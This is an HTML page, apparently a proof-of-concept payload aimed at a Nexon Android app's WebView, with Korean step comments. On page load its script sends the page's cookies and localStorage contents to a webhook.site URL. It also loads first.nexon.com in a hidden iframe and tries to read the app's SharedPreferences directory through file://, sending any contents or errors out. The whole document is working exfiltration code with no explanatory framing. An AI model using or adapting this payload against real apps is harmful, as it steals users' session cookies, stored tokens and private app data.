<html>
<body>
<script>
var webhook = 'https://webhook.site/ef466442-7cf1-4535-a8c3-05888ba975f1';

// 1. 현재 도메인 쿠키
new Image().src = webhook + '?step=1_cookie&data=' + encodeURIComponent(document.cookie);

// 2. localStorage
try {
  var ls = JSON.stringify(localStorage);
  new Image().src = webhook + '?step=2_localstorage&data=' + encodeURIComponent(ls.substring(0,500));
} catch(e) {
  new Image().src = webhook + '?step=2_ls_error&data=' + encodeURIComponent(e.toString());
}

// 3. 넥슨 도메인 쿠키를 iframe으로 시도
var iframe = document.createElement('iframe');
iframe.src = 'https://first.nexon.com';
iframe.style.display = 'none';
document.body.appendChild(iframe);

// 4. SharedPreferences 파일 접근 시도 (file:// 접근 가능 여부)
fetch('file:///data/data/com.nexon.methinks/shared_prefs/')
.then(r => r.text())
.then(d => new Image().src = webhook + '?step=4_file&data=' + encodeURIComponent(d.substring(0,500)))
.catch(e => new Image().src = webhook + '?step=4_file_error&data=' + encodeURIComponent(e.toString()));
</script>
</body>
</html>
